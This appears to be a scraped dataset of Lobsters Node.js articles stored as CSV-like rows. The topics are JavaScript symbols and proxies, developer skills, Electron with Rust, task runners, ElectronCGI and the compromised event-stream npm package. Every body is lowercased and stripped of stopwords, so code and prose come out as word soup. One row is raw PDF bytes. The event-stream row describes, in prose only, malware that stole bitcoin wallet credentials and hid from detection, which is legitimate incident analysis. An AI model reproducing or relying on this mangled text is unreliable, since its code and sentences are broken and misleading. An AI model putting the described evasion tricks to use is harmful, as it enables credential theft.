situation calling code already access symbol example reflectownkeys method able get list key object string symbol alike function trytoaddprivate symbol pseudo private const obj prop hello trytoaddprivate obj consolelog reflectownkeys obj prop symbol pseudo private consolelog obj reflectownkeys obj currently work done tackle issue adding private property class javascript name feature called private field although benefit object benefit object class instance private field available chrome property name collisionssymbols may directly benefit javascript providing private property object however beneficial another reason useful situation disparate library want add property object without risk name collisionsconsider situation two different library want attach sort metadata object perhaps want set sort identifier object simply using two character string id key huge risk multiple library use keyfunction obj objid function obj objid making use symbol library generate required symbol upon instantiation symbol checked object set object whenever object encounteredconst symbol function obj obj const symbol function obj obj reason would seem symbol benefit javascripthowever may wondering library simply generate random string use specially namespaced string upon instantiation const uuid random approachfunction obj obj const namespaced approachfunction obj obj well right approach actually pretty similar approach symbol unless two library would choose use property name risk overlapat point astute reader would point two approach entirely equal property name unique name still shortcoming key easy find especially code run either iterate key otherwise serialize object consider following example const namespacedfunction obj obj const user name thomas hunter ii age user jsonstringify user name thomas hunter ii age used symbol property name object json output would contain value well javascript gained support symbol mean json spec changed json allows string key javascript make attempt represent symbol property final json payloadwe easily rectify issue library object string polluting json output making use objectdefineproperty const uuid namespaced approachfunction obj objectdefineproperty obj enumerable false value const user name thomas hunter ii age user name thomas hunter ii age consolelog jsonstringify user consolelog user key hidden setting enumerable descriptor false behave similarly symbol key hidden objectkeys revealed reflectownkeys seen following example const obj obj symbol objectdefineproperty obj foo enumberable false value consolelog objectkeys obj consolelog reflectownkeys obj foo symbol consolelog jsonstringify obj point nearly recreated symbol hidden string property symbol hidden serializers property extracted using reflectownkeys method therefor actually private assuming use sort namespace random value string version property name removed risk multiple library accidentally name collisionbut still one tiny difference since string immutable symbol always guaranteed unique still potential someone generate every single possible string combination come collision mathematically mean symbol provide benefit get stringsin nodejs inspecting object using consolelog method object named inspect encountered function invoked output used logged representation object imagine behavior nt expected everyone genericallynamed inspect method often collides object created user symbol available implementing functionality available require util inspectcustom inspect method deprecated nodejs entirely ignored one ever change behavior inspect accident simulating private propertieshere interesting approach use simulate private property object approach make use another javascript feature available u today proxy proxy essentially wrap object allows u interpose various interaction objecta proxy offer many way intercept action performed object one interested affect attempt reading key object occurs going entirely explain proxy work like learn check post javascript object property descriptor proxy preventing extensionwe use proxy lie property available object case going craft proxy hide two known hidden property one string favcolor symbol assigned favbook easy come favcolor string read source code library additionally dynamic key eg uuid example found via brute force without direct reference symbol one access metro value proxy objectnodejs caveat feature nodejs break privacy proxy feature exist javascript language apply situation web browser allows one gain access underlying object given proxy example using functionality break private property example const originalobject process binding util getproxydetails proxy const allkeys reflectownkeys originalobject consolelog allkeys symbol fav book would need either modify global reflect object modify util process binding prevent used particular nodejs instance one heck rabbit hole interested tumbling rabbit hole check blog post protecting javascript apis
133,Lobsters,nodejs,Node.js programming,19 ways to become a better Node.JS developer in 2019,https://medium.com/@me_37286/19-ways-to-become-a-better-node-js-developer-in-2019-ffd3a8fbfe38,way become better nodejs developer,short intro yoni goldberg coauthor nodejs best practice may find follow twitter want take testing skill extreme testing nodejs javascript z reviewed improved bruno scheufler reddit community pysouth fullheap reginaldbull relativityboy add type schema typescript great candidate see research degree json schema joi see facebook flow typescript example enrich linters example bit java byte le ruby deepen architecture knowledge uncle bob mvc delivery mechanism application architecture absolutely recommend example plan utilize asynchooks reach better tracing context example understand latest serverless feature ready battle robust infrastructure field kubernetes killer example meet latest javascript feature turning green soon proposal nodegreen example become intimately familiar least one api technology graphql great candidate example go beyond unit integration test enrich testing portfolio shiny new testing technique align monitoring sredevops best practice philosophy alerting think like attacker increase security level learning attack tool technique development pipeline npm example owasp zap rich assessment penetration read list nodejs security best practice package update strategy lesson learned updating soon dangerous practice flatstream example npq liran tal greenkeeper perform gradual installation separate deploy release phase example kubernetes ate world obvious trend shortened item provides nice handson overview istio knative kuberenes job internals overview network policy helm scaffold blockchain technology embody great opportunity obvious trend shortened item gain solid machine learning skill least speak intelligently obvious trend shortened item tensorflowjs brainjs skim code selected open source library obvious trend shortened item deepen linux o understanding focus anatomy linux process shortened item tutorial cover basic dive deeper nodejs internals example last least learn using scientific method illusion competness spending hour learning learn make great deal career example thank article might like follow twitter,short introi compiled skill topic might find valuable please get overwhelmed neither developer familiar every single topic exciting thing radar javascript horizon neverendingmy name yoni goldberg independent nodejs consultant coauthor nodejs best practice work customer usa europe israel polishing nodejs application among service code application architecture review testing ci advanced training session others may find follow want take testing skill extreme consider visiting comprehensive course testing nodejs javascript z reviewed improved bruno scheufler reddit community special thanks pysouth fullheap reginaldbull relativityboy add type schema typescript great candidate typeless manner proven counterproductive errorprone see research mean must go way toward strictlytyped syntax rather choose desired degree schematic code either validating entitiesmodels using json schema joi annotating vanilla j static typing see facebook flow go way using almost fullytyped syntax using typescript later gained remarkable momentum seems find way node land consensus plan using typescript ask usage span beyond typing feature otherwise using interface abstract class take paradigm never meant enrich linterslinters free lunch min setup get free autopilot guarding code catching significant issue type gone day linting cosmetic semicolon nowadays linters catch severe issue like error thrown correctly losing information promise never resolved sorrow never really meant include bit java byte le ruby deepen architecture knowledgevery little architecture design knowledge spread around nodejs ecosystem everyone speaks microservices internal structure result application example mvc concept doubtful pattern ruby wrong mvc example build serving content underwhelming technique structuring robust backend uncle bob mvc delivery mechanism application architecture really describe entire business logic rule data access communication microservices two class controller model see example design issue potential remedyi absolutely recommend embracing heavy javaspring pattern came nodeland reason cherrypick idea provide great value without sacrificing app plan utilize asynchooks reach better tracing contextthat single threaded model one major drawback request lose context flow multiple file performs asynchronous operation variable preserved throughout lifecycle painful example often developer wish include within log entry unique identifier later one correlate log entry request easy brings new shiny new stuff asynchooks one entirely new get experimental mode soon simply put mechanism inject custom code anytime async operation starting ending given possible correlate code request preserve context lay foundation many custom package take node tracing context next understand latest serverless feature ready battle robust infrastructure field kubernetes killer note word faa serverless used interchangeably though exactly thing practically referring cloud vendor faa service like lambda google functionsoriginally faa meant development microtasks robust microservice application popularity grew appetite cloud vendor soon new feature piledup suddenly seems like worthy infrastructure robust application compete kubernetes serve large application see serverless faa orthogonal technology practically every new cloud application choose literally choice shown cloud vendor ui one three baremetal instance like gcp compute kubernetes faa consequently able compare v faasserverless telling consequence becomes mandatory design skillps example relate aws convenience meet latest javascript feature turning green sooni big fan chasing every new language feature sometimes shiny toy work code simplicity clarify time time really valuable javascript feature presented like introduction asyncawait two year ago worthwhile watching proposal list nodegreen identify attractive new feature fit coding become intimately familiar least one api technology graphql great candidate api great purpose built great control entity modification query finance record system probably want design strict endpoint single explicit data model reststyle however fall short common use case like executing similar query might return different set data lowbandwidth network dictate minimizing api payload machinetomachine communication emphasize speed name switch absolutely mix apis architecture port ie entry point application multiple apistyles easily coexist even top single web framework like expressso one learn best bet probably graphql carried great momentum straight mainstream echosystem greatly matured serf popular use case like dynamic search hierarchic data source grpc hand still niche technology fit well server server communication use case minimum overhead appreciated eg pubsubmessagequeue system go beyond unit integration test enrich testing portfolio shiny new testing techniquesalready familiar testing pyramid unit integration endtoend test great foundation successful testing strategy however past year development world gone dramatic change testing model left intact leaving u wondering test thing like microservice rich frontends serverless modern technique compliment traditional stack sometimes even replace achieve leaner testing strategy better shiny testing technique yoni align monitoring sredevops best practicesin even mediumsized app might constitute dozen physical moving part staying top big band orchestra done great care yet developer taken time learn monitoring alerting lesson site reliability engineer willing teach example often developer prioritize focus internal hardware metric like cpu memory instead starting metric directly undeniably affect enduser immediately like error rate latency call monitoring philosophy alerting customerfacing metric sometimes referred golden signal might wan na start embrace similar best think like attacker increase security level learning attack tool techniquesif think like attacker think like defender outsource defense work thirdparty company rely solely static security scanner amount attack type overwhelming development pipeline npm latest trend pace application change untamable two day conducting security workshop team add several new aws service database type new iam role implicitly developer become biggest threat educating seems like ultimate remedy bake security dna team add security touch everythingonce start turn scary become familiar common attack type tool draw application architecture flow think would attack time unconsciously start mind security every design decision every code lineexamples try owasp zap rich assessment penetration tool allows even newbie explore security level applicationread list nodejs security best practice contains attack idea including javascript code examplesconduct monthly threat analysis meeting team try look application design propose attack sound boring necessarily add gamification reward member find exploit run competition blue team design module v read team try find package update strategy lesson learned updating soon dangerous practiceteams usually hold one two npmyarn package update strategy update soon possible sometimes even using automated process update strategy sometimes someone update based goodwill approach seems superior surprisingly turned riskiest approach malicious package incident like flatstream discovered community within day waited update soon saved consider formalizing update strategy using automated tool find sweet spot updating updating soonexamples npq liran tal great advisory package installer mind also release datecommercial tool like greenkeeper pr package updated unfortunately none still capable suspending update release proven perform gradual installation separate deploy release phasesin might find useful perform safer deployment rolledout single shot leaving heart beating like hammer safer side granular deployment aka canary suggests separate phase deployment send new code isolated new production area eg new kubernetes service new machine instance stage serf nobody fear attached test people work test new code realistic environment production release gradually allow user hit new version eg entire east coast feel enough confident enough fade older versiona word caution performing fullblown canary deployment still expensive requires orchestrate many infrastructure part like routing monitoring therefore consider starting simple semimanual canary deployment eg manually spinup machine new version based monitoring metric kubernetes ate worldan obvious trend shortened item kubernetes infrastructure application component seamlessly provide networking scaleout deployment backbone service almost defacto standard hosting application popularity phenomenal supported cloud vendor unmatched echo system extension even enterprise already least one cluster beginner link provides nice handson overview already first step make sure familiar istio knative kuberenes job internals overview network policy helm scaffold bottom line hour spent deepening skill blockchain technology embody great opportunitiesan obvious trend shortened item bitcoin crypto functionality blockchains also used distributed system handling gain solid machine learning skill least speak intelligently itan obvious trend shortened item much add maybe leading trend time unfortunately clueless machine library goal least becoming comfortable intelligently speak identify quickwin opportunity eg j library like tensorflowjs brainjs provide insight without robust infrastructure skim code selected open source librariesan obvious trend shortened item beware working project long time using set technology might narrow vision hide great alternative strive investigate project frequently mostly successful open source deepen linux o understanding focus anatomy linux processshortened item understanding linux process gain true competitive advantage influence many development task like monitoring guarding process eg restarting working docker shutting gracefully many others strive understand lifecycle process signal permission model common command type process tutorial cover dive deeper nodejs internalsi really like ryan dahl creator nodejs quote never understand everything push understand system gaining solid understanding underlying machine proven valuable need handle hairy production issue designing infrastructural component eg monitor event loop performance might already familiar core building block like libuv great time deepen journey within nodejs rabbit hole learn example exactly happening inside libuv event loop cycle maybe learn interaction operating system io done eg active handle last least learn using scientific methodswhat learn internalize shape future career nevertheless many developer neither learning strategy learn learn effectively using scientific method consider meeting preventing javascript type bug vp asks keep using vanilla javascript without refactoring entire codebase suddenly colleague suggests using facebook flow everybody room like suddenly remember read never internalized slipped mind come apparently phenomenon named illusion competness explains forget thing may spend precious hour reading blog post fooling remember thing within day study showed try speak later someone read summary next day greatly improve chance memorizing concept various technique help remember pull right piece knowledge right time see example spending hour learning learn make great deal career example thank article might want follow
134,Lobsters,nodejs,Node.js programming,Bash completion from JSON fields,https://github.com/antonmedv/fx-completion,bash completion json field,join github today sign file permalink fxcompletion fx install usage todo license resource license reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time fxcompletion bash completion fx install add bashprofile file next line source fxcompletion bash usage field json file provided fx used file first argument todo license mit bash completion fx resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
135,Lobsters,nodejs,Node.js programming,Building a fast Electron app with Rust,https://keminglabs.com/blog/building-a-fast-electron-app-with-rust/,building fast electron app rust,finda design consideration nonelectron alternative native o x gamelike ggez quartz event service glut electron window option oneline architecture keydown event interop neon library argument object mailing list lynaghk performance verification download try reflection performance wrap try finda write reading measuring input latency github repo rustneon xi editor thanks nikita prokopov saul pwanson tom ballinger veit heller julia evans bert muthalaly,march kevin j lynagh built finda wanted fast specifically respond user input within millisecond given goal might surprised learn finda built electron framework often decried opposite fast article explain finda us rust leverage electron strength easy packaging access complex osspecific apis visual capability browser minimizing downside unpredictable latency memory usage design consideration diving technical detail help understand design goal finda finda support single interaction type stuff find thing browser tab text editor buffer local file browser history open window whatever goal finda feel like application like commandtab part operating system appearing instantly needed afterwards disappearing quickly need menu multiple window button kind native ui really finda interaction requires global shortcut raise finda fullscreen regardless current focused application capturing input keystroke rendering search result otherwise finda invisibly chill background nonelectron alternative given minimal requirement considered option native o x decided option early two reason want option port finda window believe saying linux since beta tester asked could buy version respective platform use xcode native development upgrade o x would almost certainly break computer new different way currently broken made peace gamelike written one pixel shader life gradient white black hey game fast maybe work explored option decided try prototype using ggez wonderful rust game library built top sdl found api approachable graphic novice like setting color drawing rectangle rather pipeline structs byte shaders take byte soon realized primitive still going require quite bit work part compose decent application example text rendered given string font size typeface finda highlight match type mean need juggle multiple typeface color well track bounding box drawn substring layout everything beyond rendering also ran difficulty operating system integration front found difficult build chromeless window one without titlebar minimizemaximizeclose stoplight button run app background without appearing dock implement global hotkey via quartz event service hour managed get key code gave realized need go separate set hoop lookup active keymap translate key code shortcut none really game problem seem like switching another framework like glut opengl would better ggez sdl electron built apps using electron knew meet finda requirement browser originally designed layout text electron provides extensive window option oneline api global shortcut unknown performance subject rest article architecture architectural tl dr electron used user interface layer rust binary handling everything else finda open key pressed browser invokes document onkeydown listener translates javascript keydown event plain javascript object representing event something like name keydown key cg javascript object passed rust later rust return another plain javascript object representing entire application state query search term result label foo icon barpng selectedidx showoverlay false javascript object passed reactjs actually render dom using divs ols two thing note architecture first electron maintain kind state perspective entire application function recent event possible rust side maintains finda internal state second step occur every user interaction keyup keydown meet performance requirement three step together must complete interop interesting bit step look like call rust javascript using awesome neon library build nodejs module rust electron side feel like calling kind package var native require native var newapp nativestep name keydown key cg rust side function bit complicated let walk piece pub fn step call call jsresult jsobject let scope callscope let event callargumentsrequire scope check jsobject let eventtype string event get scope name downcast jsstring unwrap value javascript several semantics map neatly rust language semantics eg argument object infamous dynamic variable rather try map j call rust function signature neon pass function single call object detail extracted since written calling j side function know first argument javascript object always name key associated string value eventtype string used direct rest translation javascript object appropriate finda event enumeration variant match eventtypeasstr blur finda step mut app finda event blur hide finda step mut app finda event hide show finda step mut app finda event show keydown let event get scope key downcast jsstring unwrap value finda step mut app finda event keydown branch also invokes finda step function actually update application state response event changing query returning relevant result opening selected result hiding finda whatever write rust detail future blog post sign mailing list follow lynaghk like get notified happens application state updated need returned electron side rendering process look similar direction translating rust data structure javascript one let jsobject new scope oset showoverlay jsboolean new scope appshowoverlay oset query jsstring new scope appquery unwrap oset selectedidx jsnumber new scope appselectedidx first creating javascript object returned electron associating key primitive type returning result array object requires hoop size array must declared advance rust structure explicitly enumerated overall bad let r jsarray new scope appresultslen idx r appresultsiter enumerate let jsr jsobject new scope jsrset label jsstring new scope rlabel unwrap let ref icon ricon jsrset icon jsstring new scope iconpathname unwrap rsset idx jsr oset result r finally end function javascript object returned neon handle detail passing caller javascript side performance verification machinery perform practice typical trace single keypress seen performance tab chrome devtools builtin electron step labeled translating keypress event processing event rust rendering result react first thing note green bar top show happens second thing note oh dang rust fast rust interop section actual nativestep call highlighted flamegraph completes le millisecond particular keydown event corresponds adding letter query mean single millisecond finda run regex search open window emacs buffer page title url browser history filename work downloads dropbox folder sort result according quality heuristic number match whether occur word boundary forth translates top result javascript return believe fast download try course macbook air ssd fast enough even enumerate file millisecond finda transparently build maintains index future post bulk time spent rendering react render bar bottom flamegraph browser layout purple paint green load thumbnail image diskcache rightmost yellow specific performance number vary event trace typical rust take millisecond actual work majority time taken rendering entire javascript execution consistently finish reflection performance given performance number one perspective would reduce response time dropping react perhaps dom entirely instead handle layout rendering manually canvas element however seriously diminishing return putting aside whether human differentiate response response likely lowlevel operating system graphic driver lcd physic dominates actual response time scale another perspective extra budget waste slower rendering path path benefit case electron certainly addition easy use builtin profiling tool saw dom cs provide wonderful amount runtime malleability easy open inspector play different typeface color spacing entirely datadriven application like finda ability visually sketch play production medium essential impossible effectively prototype searchbased interaction pushing pixel around graphic design tool perhaps someone know opengl like back hand kind sketching emacs game dev could throw together unity able imagine prototype release finda without electron rust spectacular technology big thanks everyone contributed wrap electron rust turned great fit design constraint finda electron make easy build distribute desktop app shielding tedious detail font rendering lowlevel o hotkey window apis rust make easy write fast safe lowlevel data structure encourages think memory performance way normally oblivious wearing usual javascript clojurescript hat together make powerful combination try finda experience speed try hybrid rustelectron approach project please write love hear working help way reading check dan luu awesome work measuring input latency across computer today check neon github repo rustneon building nodejs extension using rust xi editor open source rust text editor emphasis performance thanks thanks nikita prokopov saul pwanson tom ballinger veit heller julia evans bert muthalaly thoughtful feedback article
136,Lobsters,nodejs,Node.js programming,Node.js Task Runners: Are they right for you?,https://blog.logrocket.com/node-js-task-runners-are-they-right-for-you-bb29ea30b7fa,nodejs task runner right,brief history nodejs day rise task runner grunt gulp module pattern gruntfilejs gulpfilejs webpack task runner alternative wsl shell script packagejson browserify babel conclusion monitor failed slow network request production try logrocket http logrocketcomsignup logrocket start monitoring free,post cover following topic history philosophy behind nodejs task runner developed nodejs different approach taken popular task runner bash may used simpler alternative brief history nodejs tooling ecosystem javascript incredible hard pressed find language much tooling many different user contributing tooling humble beginning language originally designed day foothold server space find another language malleable one nodejs popular serverside implementation javascript first introduced platform nearly overnight allowed frontend developer quickly become viable backend developer unblocking frontend team everywhere success warranted tool easily distributing source code need satisfied npm nodejs heralded fast approachable perhaps alluring simple began syphoning user platform one platform php language created generate dynamic website php perhaps thousand global function available time requires stack configuration file nodejs allowed developer migrate platform get fresh start new yet developed battery included framework language one guiding principle nodejs keep core simple find builtin tool connecting mysql generating uuid calculating levenshtein distance javascript language transforming well feature backwards compatible thanks userland polyfills order language advance simply must add occasional new syntax developer yearn new syntax yet old browser reality led development transpilers simplicity working nodejs eventually dwarfed importance fact code written javascript lingua franca web nodejs gained traction tool transforming frontend asset one representation sas another representation cs one catch though javascript engineer typically want keep writing javascript led development task runner specialized nodejs tool designed run tool rise task runner essentially three technology required construct website consumed directly browser first html controlling structure webpage second cs controlling appearance webpage finally javascript used programming website interactivity simpler website small team working language directly usually fine approach however complex website website built team engineer specialization working directly basic language start fall short consider example branding corporate website change hexadecimal color code used several different style file may need changed raw cs operation would require orchestrated change across team sas change could made single line similar concept apply html generate markup using templating tool like mustache virtual doms like react also apply javascript engineer may write code using asyncawait syntax get transpiled complex switch statement callback point may site need sas compiled cs code need transpiled reactjsx template need converted raw javascript operation also beneficial minifying compiled code compressing png image smallest representation one task need run particular order website built depending context particular website build built developmentdebugging purpose production task must altered skipped entirely complexity inspired creation task runner tool two popular nodejs task runner came rescue first grunt first commit made september tool take imperative approach configuring different task building deeply nested object calling method second one gulp initial commit july tool take different approach functional nature piping output one function input another function streaming result around let consider simple web application like mockup using subset technology application depends multiple sas j file like convert sas file cs concatenating result sake brevity also simply concatenate j file together assume module pattern instead using commonjs require statement let see configuration might look using different task runner gruntfilejs approach requires following module installed grunt gruntcontribsass gruntcontribconcat gruntcontribclean approach run grunt style grunt script grunt build work const grunt require grunt gruntinitconfig sas dist file expand true cwd srcstyles src sc dest temp ext cs concat style src temp cs dest publicdistcss script src srcscripts j dest publicdistjs clean temp temp cs gruntloadnpmtasks gruntcontribsass gruntloadnpmtasks gruntcontribconcat gruntloadnpmtasks gruntcontribclean gruntregistertask style sas concat style clean temp gruntregistertask script concat script gruntregistertask build style script gulpfilejs equivalent gulp version previous gulp example follows requires gulp gulpsass gulpconcat nodesass installed approach run gulp style gulp script gulp build work const gulp require gulp const sas require gulpsass const concat require gulpconcat sasscompiler require nodesass gulptask style function return gulpsrc srcstyles sc pipe sas error sasslogerror pipe concat distcss pipe gulpdest public gulptask script function return gulpsrc srcscripts j pipe concat distjs pipe gulpdest public gulptask build gulpseries style script see gulp example little terse grunt example philosophically two tool take different approach implementing runnable task ultimately allow similar thing grunt introduced gulp comparable popularity throughout lifespan google trend grunt v gulp project highly modular allowing developer create specialized plugins plugins allow external tool eslint sas browserify easily integrate task runner actually example code looked earlier popular sas tool gruntcontribsass module gulpsass module available two tool may essentially done writing grunt last publish made eight month ago gulp last publish year ago mean done word literally figuratively fourletter word javascript community well case probably mean core task runner module everything need additional functionality added via plugin webpack tool similar grunt gulp also used take source file combine various way output single file however different enough fair compare grunt gulp primarily tool transforming javascript based requires hierarchy dependency definitely worth mentioning popularity surpassed grunt gulp first commit webpack happened march first commits grunt gulp article written still active development last contribution occurred hour ago whereas grunt gulp aide performing many type generic task webpack specifically interested building frontend asset webpack also configured manner similar grunt gulp using file called webpackconfigjs also highly modular achieve similar result using plugins like sassloader philosophical difference aforementioned tool still similar sense nodebased process ultimately transforms asset configured via javascript file task runner alternative complex build system make total sense use nodejs task runner tipping point build process get complex maintaining language one application written make sense however many project task runner end overkill additional tool need add project keep date complexity task runner easy overlook readily available via npm install previous example looked needed module use grunt space use gulp simple build command concatenate two javascript file compileconcatenate two sas file take grunt gulp gulp approach taking output one operation piping another operation sound familiar piping system also available u via command line automate use bash script scripting feature already available user macos linux computer wsl help window use following three bash script achieve grunt gulp example shell script stylesh usrbinenv bash cat srcstyles sc sas publicdistcss scriptsh usrbinenv bash cat srcscripts j publicdistjs buildsh usrbinenv bash stylesh scriptsh use approach need sas binary executable time take perform entire build operation also lessened machine operation take mean using disk space running fast difference likely even higher complex build step packagejson even inlined inside packagejson file command executed via npm run style npm run script npm run build script style cat srcstyles sc sas publicdistcss script cat srcscripts j publicdistjs build npm run style npm run script course tradeoff biggest difference bash shell scripting language syntax completely unlike javascript may difficult engineer work javascript project write appropriate script required build complex application another shortcoming bash script require sort executable available operation want incorporate luckily u usually browserify tool resolving commonjs requires concatenating output offer executable babel goto transpiler also offer executable sas le coffeescript jsx tool executable available one available write however reach point might want consider using task runner conclusion command line scripting capability machine powerful easy overlook especially spend much time higher level language like javascript seen today often powerful enough complete many frontend asset building task often faster consider using tool start next project switch heavier solution like task runner reach limitation bash scripting monitor failed slow network request production deploying nodebased web app website easy part making sure node instance continues serve resource app thing get tougher interested ensuring request backend third party service successful try logrocket http logrocketcomsignuplogrocket like dvr web apps recording literally everything happens site instead guessing problem happen aggregate report problematic network request quickly understand root cause logrocket instrument app record baseline performance timing page load time time first byte slow network request also log redux ngrx vuex actionsstate start monitoring free
137,Lobsters,nodejs,Node.js programming,ElectronCGI - Cross Platform .Net Core GUIs with Electron,https://www.blinkingcaret.com/2019/02/27/electron-cgi/,electroncgi cross platform net core gui electron,update fastest framework use serve request web net core support wpf winforms electroncgi npm package electroncgidotnet nuget package electroncgi node npm package electroncgidotnet nuget package electronnet edgejs qt binding c net costly work cgi common gateway interface benefit term speeding compilation time published selfcontained executable early day asynchronous apis node,update new version electroncgi find exciting moment net core first came support linux mac window since matured point aspnet core one fastest framework use serve request web although good web side thing desktop given amount attention even though net core support wpf winforms still leaf linux mac blog post crossplatform way developing desktop application using net core electron called electroncgi rely running web server net core code precompiled show simple using electroncgi configure nodejselectron ui run code net core console application example request type greeting string argument sent net application responds string contains greeting nodejselectron adding electroncgi npm package const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project netcoreproject build connectionsend greeting john greeting consolelog greeting print hello john net console application adding electroncgidotnet nuget package using electroncgidotnet static void main string args var connection new connectionbuilder withlogging build expects request named greeting string argument return string connectionon string string greeting name return hello name wait incoming request connectionlisten need start video show easy setup simple development workflow video also github link electroncgi node npm package electroncgidotnet nuget package even though already way create electronnodejs application run net code felt involved could provide better development experience probably popular way ui running electron running net code electronnet way work net code run full aspnet application electron app display web page rendered serverside aspnet also electron functionality exposed aspnet application using web socket send requestscommands initiated aspnet code example possible open new electron window aspnet controller way biggest drawback see approach even though goal create desktop application still handle lot task foreign scenario example create new aspnet core mvc application come cookie policy http configuration hsts routing etc desktop application scenario make sense end getting way ideally want write ui using html cs bit javascript able invoke net code response user action alternative electronnodejs edgejs work enabling net code run inprocess node although technologically impressive requirement make using little bit hard hello world using edgejs var edge require edge var helloworld edgefunc function async return hello world helloworld function error result error throw error consolelog result log hello world yes c code inside using use template string still get intellisense also way bring method precompiled dll however requirement method specific signature func object task object also mention fully native solution one come mind qt qt lot going used well know name tesla model dashboard run qt example qt binding several language including c net problem qt thinking something commercial becomes costly tune per developer per year given think space one way crossplatform desktop application work electroncgi draw inspiration first dynamic web request made reality early day web early day thing web server able serve static web page serve dynamic page idea external executable take representation web request produce response put forward way executable got web request header environment variable request body sent standard input stream stdin processing request executable would send resulting html back web server standard output stream stdout way thing called cgi common gateway interface mechanism available operating system work perfectly well super fast easy use example bash write something like l redirecting stdout l stdin exactly electroncgi take advantage using nodejs net example implementation right reason work runtimeslanguages connection created nodejs net console application electroncgi launch net application grab hold stdin stdout stream also keep net application running connection closed every time request sent ie connectionsend requesttype args callbackfn request serialised json written net application stdin stream handling request net core application sends response back stdout ie connectionon argtype returntype requesttype handlerfunction electroncgi take care end thing need send request nodejs provide request handler request net using stdinstdout communication channel provides little overhead performed quick test able sequentially send request receive response one second benefit mentioned electroncgi net core create application run linux window mac use c also want since nuget package net electroncgidotnet target net standard use full net framework version able run window though might still interesting net web developer want use html cs build ui reusing existing net code might speaking reusing existing net code even though requirement net application connect console app restriction console application add dependency mean bring nuget package reference net project might want use development experience also quite good establish connection electron app using dotnet run example const connectionbuilder require electroncgi const connection new connectionbuilder connectto dotnet run project pathtodotnetproject build taking approach make change net project thing need see take effect refresh page leave enabled even access chrome dev tool electron refresh new connection created cause dotnet run executed compile run project pending change imagine development experience make change ui andor net code see applied ctrlr also thanks good work net team term speeding compilation time really feel seamless done always connect published selfcontained executable extra performance boost application depend net sdk also need debug net code use attach functionality visual studio code full visual studio attach running process add breakpoints early day still rough edge electroncgi particularly error handled right enable logging net new connectionbuilder withlogging pathtologfile see something went wrong net side thing exception message quite descriptive example electroncgidotnethandlerfailedexception request handler request type division failed systemdividebyzeroexception attempted divide zero whenever unhandled exception net connection lost nodejselectron connection ondisconnect method invoked use example restart connection const connectionbuilder require electroncgi let connection new connectionbuilder connectto dotnet run project dotnetcalculator build connectionondisconnect alert connection lost restarting connection new connectionbuilder connectto dotnet run project dotnetcalculator build keep mind maintain state net since executable start connection made kept running listening request connection closed connectionclose nodejselectron exception happens state lost behavior might ideal people feel inclined error surface nodejs callback first argument request much like custom asynchronous apis node example connectionsend requesttype args err data err handle error return otherwise handle data another thing might useful add ability initiate request either end connection right create connection nodejs net application send request node net reason add ability send request net node connection established another aspect need improvement one particular net implementation way request currently handled right request handler served stdin monitored mean request handler take long time run subsequent request originating node queued net application long running request finish also option register handler request would welcomed currently different way register handler request type handler request type requesttype argument return value void string requesttype action handler handler request type requesttype argument type return value void string requesttype action handler handler request type requestype argument tin return type tout void tin tout string requesttype func tin tout handler async handler request type requesttype argument type return value void onasync string requesttype func task handler async handler request type requesttype argument type return type tout void onasync tin tout string requesttype func tin task tout handler possible use dynamic argument type term thing missing documentation certainly one specifically use electroncgi electron react angular vue blazor web ui framework might missing related
138,Lobsters,nodejs,Node.js programming,Community makes Rust an easy choice for npm,https://www.rust-lang.org/static/pdfs/Rust-npm-Whitepaper.pdf,community make rust easy choice npm,,obj length r filter flatedecode stream u ٻ dɧ endstream endobj obj endobj obj type page parent r resource r content r mediabox rotate endobj obj procset pdf text imageb imagec imagei colorspace r font r r r xobject r endobj obj length r type xobject subtype image width height interpolate true colorspace r bitspercomponent filter flatedecode stream p ؿn p r id ᒰ e q 簐e q u llv e cky ܪ
139,Lobsters,nodejs,Node.js programming,Compromised npm Package: event-stream,https://medium.com/intrinsic/compromised-npm-package-event-stream-d47d08605502,compromised npm package eventstream,compromised npm package eventstream eventstream flatmapstream dominictarreventstream package bitpaycopay description field bitpaycopay could attack prevented csp content security policy mechanism copay application appears disabled feature intrinsic danger malicious module,compromised npm package eventstreamownership popular npm package eventstream transferred original author malicious user package receives weekly downloads depended nearly package malicious user able gain trust original author making series meaningful contribution package first publish package malicious user occurred september malicious user modified eventstream depend malicious package flatmapstream package specifically crafted purpose attack package contains fairly simple indexjs file well minified indexminjs file two file github appear innocent enough however published npm package minified version file additional code injected requirement code uploaded npm module equivalent code stored publicly git repositorythe addition malicious package list eventstream dependency came light november documented heavily dominictarreventstream issue made two month compromised package published one many benefit open source software code audited many different developer however silver bullet example openssl open source project receiving highest scrutiny still affected serious vulnerability heartbleedwhat package package represents highly targeted attack ultimately affect open source app called bitpaycopay according readme copay secure bitcoin wallet platform desktop mobile device know malicious package specifically target application obfuscated code read description field project packagejson file us description decode encrypted payloadfor project copay description field properly match key used encryption operation fails silently description field bitpaycopay secure bitcoin wallet key required decrypt datathe package flatmapstream contains encoded data cleverly hidden test directory directory available github repository available raw package encoded data stored array part part minifiedobfuscated also encrypted various degree encrypted data includes method name could alert malicious behavior static analysis tool string compile method require creating new module done best cleanup file make human readable following two code sampleshere first part interesting mostly appears bootstrap function load second part appears work modifying file name reedsolomondecoderjs submodule file already modified known happened appears file nothing modified modifies file also replaces access modified timestamps original value way glance file disk would immediately notice modifiedand interesting second part superfluous piece removed make original intent obviousthis file monkeypatches functionality bitcorewalletclient package specifically getkeys method credential class back original function insert code transmit credential wallet third party server server located credential likely used gain access user account allow attacker steal money original ownerthe package make several attempt avoid detection example run using test bitcoin network identified testnet instead run live bitcoin network named livenet could help avoid detection affected app run acceptance test test network also appears run bootloader release build generated looking first argument processargv testing regular expression build release returning match made argument likely provided sort build serverhow could attack prevented may tempting rely tool scan npm package way static analysis particular attack encrypts malicious source code avoid detection protect attack different approach must particular attack appears run normal webpage well application built cordova tool converting web apps mobile apps attack could prevented making use csp content security policy standard specifying url webpage communicate specified via web server header cordova even mechanism specifying third party service contacted however copay application appears disabled featurecsp great tool securing frontend application however feature built nodejs intrinsic nodejs package provides ability whitelist url application communicate much like much powerful thing well intrinsic used whitelist filesystem access child process access sensitive process attribute tcp udp connection even finegrained database access whitelists specified perroute basis making intrinsic far powerful firewallinterestingly attack eventstream wherein attacker monkeypatches sensitive function malicious one make outbound http request evil server exactly warned previous post danger malicious module supplychain attack going become prevalent time targeted attack like package specifically target copay application also become prevalent
